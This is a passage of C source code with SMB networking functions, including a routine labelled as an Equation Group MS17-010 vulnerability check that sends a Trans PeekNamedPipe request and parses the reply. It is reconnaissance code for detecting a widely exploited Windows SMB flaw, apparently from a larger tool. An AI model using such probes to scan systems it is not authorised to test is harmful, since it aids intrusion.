	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

/*
 *
 *
 *
 *	Equation Group MS17-10 vulnerablity check networking function(s)
 *
 *
 *
 */

BOOLEAN SendRecvTransPeekNamedPipeCheck(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_peek_namedpipe_check_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);


	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);


	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}
